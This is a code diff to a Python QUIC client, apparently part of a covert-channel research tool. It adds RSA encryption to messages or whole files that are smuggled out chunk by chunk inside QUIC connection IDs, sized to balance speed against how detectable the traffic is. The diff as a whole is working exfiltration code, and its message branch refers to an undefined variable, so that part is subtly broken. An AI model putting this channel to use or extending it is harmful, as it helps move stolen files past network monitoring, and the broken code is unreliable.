@@ -12,7 +12,7 @@ from urllib.parse import urlparse
 import aioquic
 import wsproto
 import wsproto.events
-from aioquic.quic.connection import GLOBAL_CID_QUEUE
+from aioquic.quic.connection import GLOBAL_CID_QUEUE, RSA_BIT_STRENGTH, GLOBAL_BYTE_ORDER
 from aioquic.asyncio.client import connect
 from aioquic.asyncio.protocol import QuicConnectionProtocol
 from aioquic.h0.connection import H0_ALPN, H0Connection
@@ -28,6 +28,9 @@ from aioquic.quic.events import QuicEvent
 from aioquic.quic.logger import QuicFileLogger
 from aioquic.quic.packet import QuicProtocolVersion
 from aioquic.tls import CipherSuite, SessionTicket
+
+from Crypto.PublicKey import RSA
+import ccrypto
 
 try:
     import uvloop
@@ -443,6 +446,12 @@ if __name__ == "__main__":
         "--message", type=str, help="A message to send via a covert channel"
     )
     parser.add_argument(
+        "--cc-private-key", type=str, help=f"A PEM formated {RSA_BIT_STRENGTH} bit RSA key."
+    )
+    parser.add_argument(
+        "--cc-server-public-key", type=str, help=f"A PEM formated {RSA_BIT_STRENGTH} bit RSA key."
+    )
+    parser.add_argument(
         "--cid-size", type=int, help="Number of bytes for the CID paylod. Lower, more requests, higher less but more detectable", default=6
     )
     parser.add_argument(
@@ -603,16 +612,32 @@ if __name__ == "__main__":
         uvloop.install()
 
     cid_payloads = []
+    command = None
+    payload = None
     # Chunk the messages or file into 6-byte chunks
     if args.message:
-        cid_payloads = [args.message[i:i+args.cid_size] for i in range(0, len(args.message), args.cid_size)]
+        command = b'm'
+        message_bytes = message.encode('utf8')
+        payload = command + len(message_bytes).to_bytes(4, byteorder=GLOBAL_BYTE_ORDER) + message_bytes
     elif args.file:
+        command = b'f'
         file_bytes = open(args.file, 'rb').read()
-        cid_payloads = [file_bytes[i:i+args.cid_size] for i in range(0, len(file_bytes), args.cid_size)]
-    
-    for payload in cid_payloads:
-        GLOBAL_CID_QUEUE.put(payload)
-    
+        payload = command + len(file_bytes).to_bytes(4, byteorder=GLOBAL_BYTE_ORDER) + file_bytes
+
+
+    if payload:
+        if not args.cc_private_key or not args.cc_server_public_key:
+            raise Exception("RSA key required if sending a message or a file.")
+        else:
+            private_key = RSA.import_key(open(args.cc_private_key).read())
+            server_public_key = RSA.import_key(open(args.cc_server_public_key).read())
+            n_bytes = ccrypto.get_compact_key(private_key)
+            encrypted_payload = ccrypto.encrypt(server_public_key, payload)
+            keyed_payload = n_bytes + encrypted_payload
+            cid_payloads = [keyed_payload[i:i+args.cid_size] for i in range(0, len(keyed_payload), args.cid_size)]    
+
+    for cid in cid_payloads:
+        GLOBAL_CID_QUEUE.put(cid)
     for i in range(max(1,len(cid_payloads))):
         asyncio.run(
             main(
